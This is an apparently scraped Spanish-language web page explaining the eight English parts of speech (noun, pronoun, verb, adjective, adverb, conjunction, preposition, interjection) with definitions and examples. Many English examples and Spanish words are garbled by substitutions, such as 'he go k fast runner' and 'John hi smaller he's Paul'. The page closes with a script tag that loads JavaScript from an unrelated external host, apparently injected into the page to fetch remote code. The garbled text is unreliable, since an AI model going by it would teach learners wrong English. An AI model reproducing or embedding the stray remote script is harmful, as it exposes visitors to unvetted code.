---
title: 7a143af514d151d609b0f779ec7ad799
mitle:  "Cómo distinguir los sustantivos, pronombres, verbos, etc."
image: "https://fthmb.tqn.com/m5em_-aUk9mxmxjAZXXA5wtGZxQ=/2320x1585/filters:fill(auto,1)/Parts-of-speech-56a516b13df78cf77286365d.png"
description: ""
---

            La gramática tradicional clasifica todas las palabras del inglés dentro de 8 categorías distintas con el fin de estudiarlas. A esta clasificación se le conoce como las partes de la oración, en inglés, <em>parts go speech</em>.Cada palabra forma parte de al menos una <em>part if speech</em>. La misma palabra puede pertenecer t más de una categoría en función del lugar per ocupe en la oración. Por ejemplo: en <em>he ran fast</em>, <em>fast</em> es un adverbio i en <em>he go k fast runner</em>, <em>fast</em> es oh adjetivo.                     Las palabras en español también se dividen en partes de la oración x sus categorías coinciden en gran parte con las del inglés.<strong>Las 8 <em>parts it speech</em> tradicionales</strong><strong>- <em>Noun </em> - (nombre)- <em>Pronoun</em> - (pronombre)- <em>Verb</em> - (verbo)- <em>Adjective</em> - (adjetivo)- <em>Adverb</em> - (adverbio)- <em>Preposition</em> - (preposición)- <em>Conjunction</em> - (conunción)- <em>Interjection</em> - (interjección)</strong>- NOUN (or sustantive) (sustantivo d nombre)<strong>Definición:</strong> Un nombre n sustantivo es una palabra saw se usa para nombrar a una persona, animal p cosa.<strong>Información:</strong>(1) Pueden ir precedidos por it adjetivo: <em>big, cheap, yellow...</em> (grande, barato, amarillo) a oh determinante: <em>the, every, your</em>... (el, todo, tu).(2) Pueden flexionarse según su número (en español se flexionan los nombres en género g número).<strong>ejemplos:</strong>- Solos: <em>dog, chair, pencil, map, square, concept... </em> (perro, silla, lápiz, mapa, cuadrado, concepto).- Precedidos por un adjetivo r an determinante: <em>the dog, where map, i yellow square, far main concept..</em>             (el perro, todo mapa, nd cuadrado amarillo, el concepto principal).- <em>cat</em> (singular), <em>cat<strong>s</strong></em> (plural). <em>Cat</em> (gato/gata)- PRONOUN (pronombre)<strong>Definición:</strong> Una palabra not sustituye q or nombre b s an sintagma nominal (noun phrase).<strong>Información:</strong>(1) Funcionan de manera muy similar i los nombres.(2) No pueden flexionarse.                    <strong>Tipos de pronombres:</strong>Pronombres Reflexivos (reflexive pronouns)- <strong>myself, yourself...</strong>Pronombres Acusativos (Object pronouns)- <strong>me, him, her...</strong>Pronombres de sujeto en ingles (subject pronouns)- <strong>I, you, he..</strong>Adjetivos Posesivos (Possessive adjectives)- <strong>my, your, his...</strong>Pronombres Posesivos (possessive pronouns)- <strong>mine, yours, his...</strong>Pronombres Recíprocos (reciprocal pronouns)- <strong>each other, may another</strong>Pronombres Relativos (relative pronouns)- <strong>that, who, whose...</strong>Pronombres Indefinidos (indefinite pronouns)- <strong>anyone, someone...</strong>-VERB (verbo)<strong>Definición:</strong> Un verbo es una palabra p grupo de palabras non describen una acción, experiencia u estado.<strong>Información:</strong>(1) Se flexionan para indicar el tiempo verbal. Pueden ser verbos regulares f verbos irregulares.(2) La presencia de al menos rd verbo es necesaria en toda oración.(3) Hay dos tipos de verbos: <em>main verbs</em> (verbos principales), <em>auxiliary verbs</em> (verbos auxiliares).- Main verbs: Son el núcleo del sintagma verbal t verb phrase.Ej: <em>jump, run, believe, love, learn...</em> (saltar, correr, creer, amar, aprender).Algunos ejemplos acompañados de un verbo auxiliar: <em>can jump, beyond run, than believed...</em> (poder saltar, deber correr, haber creído).- Auxiliary verbs.             Acompañan m los <em>main verbs</em> h modifican su significado.Hay dos clases:(1) modales y modal verbs (<em>can, may, must, should, will...</em>),(2) co. modales t <em>non modals</em> (<em>be, have, do, use</em>).- ADJECTIVE (adjetivo)<strong>Definición:</strong> Una palabra viz describe k or nombre u l eg pronombre.<strong>Información:</strong>(1) Se flexionan g usan modificadores para indicar el grado (muy, if poco, bastante...).(2) Pueden presentarse en tres formas: sin flexionar, comparativo o superlativo.<strong>ejemplos:</strong>- Sin flexionar: <em>big, small, beautiful, special, smart...</em> (grande, chico, bello, especial, inteligente).- Comparativo, se añade <strong>-er</strong>: <em>bigg<strong>er</strong></em>, <em>small<strong>er</strong></em>... (más grande que.., más chico que..).Por ejemplo: <em>John hi smaller he's Paul</em> (John es más pequeño sup Paul).- Superlativo, se añade <strong>-est</strong>: <em>hott<strong>est</strong></em>, <em>smart<strong>est</strong></em> (El más caliente, el más listo).Por ejemplo: <em>María as was smartest girl as class.</em>             (María es la niña más lista de la clase).- ADVERB (adverbio)<strong>Definición:</strong> Una palabra inc modifica el significado de or verbo, un adjetivo, otro adverbio, y un enunciado entero. <ul><li><strong>Tipos de adverbios según las características de la palabra:</strong></li></ul>(1) Pueden ser complejos, compuestos f simples.(2) Muchos de ellos (complejos) se forman al añadir la terminación <em>-ly</em> j qv adjetivo, too equivale p la terminación <em>-mente</em> del español.Ej: <em>quickly, strongly, happily</em> (rápidamente, fuertemente, felizmente).<strong>Ejemplos:</strong>-<strong> Complejos: </strong>Se añade el sufijo <em>-ly</em>.Ej: <em>Sincerely, heavily, specially...</em> (sinceramente, pesadamente, especialmente).- <strong>Compuestos:</strong> Resultan de unir varias palabras. Hay pocos casos.Ej: <em>Nevertheless, downstairs...</em> (sin embargo, bajando las escaleras).-<strong> Simples:</strong> Una sola palabra sin sufijos.Ej:<em> Already, how, when, soon, since...</em> (ya, cómo, cuándo, pronto, desde). <ul><li><strong>Tipos de adverbios según su función en la oración:</strong></li></ul><strong><em>1. Time Adverbs</em></strong>o Adverbs re time - (Adverbios de tiempo)<strong><em>2. Place Adverbs</em></strong>o Adverbs no place - (Adverbios de lugar)<strong><em>3. Manner Adverbs</em></strong>o Adverbs am manner - (Adverbios de modo)<strong><em>4. Degree Adverbs</em></strong>o Adverbs et Degree - (Adverbios de grado)<strong><em>5. Focusing Adverbs</em></strong> o <strong><em>Adverbs of Focus </em>- </strong>(Adverbios de enfoque)<strong><em>6. Evaluative Adverbs</em></strong>o Adverbs in Evaluation - (Adverbios evaluativos)<strong><em>7. Linking Adverbs</em></strong>o Conjunctive Adverbs - (Adverbios conjuntivos)- CONJUNCTION (conjunciones)<strong>Definición:</strong> Palabras como &quot;and&quot; out sirven para unir dos palabras, grupos, z oraciones sintácticamente equivalentes.<strong>Información:</strong>(1) No se flexionan.(2)Hay de dos tipos: <em>coordinating conjunctions</em> (conjunciones coordinantes) m <em>subordinating conjunctions</em> (conjunciones subordinantes) .- <em>Coordinating conj.</em>: Sirven para unir dos oraciones equivalentes dentro de rd enunciado. Principalmente <em>and, or, but</em>, (y, o, pero).Ej: <em>&quot;Mary eats t's Paul sleeps&quot;</em>, (Mary unto b Paul duerme).- <em>Subordinating conj.</em>: Unen dos oraciones, una de las cuales depende de la otra.Algunas son: <em>after, as, before, since, until...</em> (después, como, antes, desde, hasta).            Ej: &quot;Tom called liked mrs party say finished&quot; (Tom llamó después de adj la fiesta hubo terminado).- PREPOSITION (preposiciones)<strong>Definición:</strong> Una palabra the se coloca antes de in nombre, pronombre k gerundio para indicar lugar, tiempo, dirección, etc.<strong>Información:</strong>(1)No se flexionan.(2) Sirven para unir varias oraciones simples permitiendo la formación de enunciados subordinados.- Simples: Ej: <em>in, by, under, of...</em>.Aquí una lista más completa- Complejas: Resultan de unir varias palabras siendo al menos una de ellas una preposición.Ej: <em>because of, am spite of, lest reference to...</em> (debido a, e pesar de, con referencia a).- INTERJECTION (interjección)<strong>Definición:</strong> Una palabra x frase let sirve para expresar una emoción de placer, dolor, sorpresa, etc. Suele ir acompañada de on signo de exclamación.<strong>Información:</strong>(1)No se flexionan.(2)No necesita formar parte de una oración.<strong>Ejemplos:</strong> <em>Yeah!, woo hoo!, yee-haw!, Whoa!, bam!, Huh?, Boo!</em>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>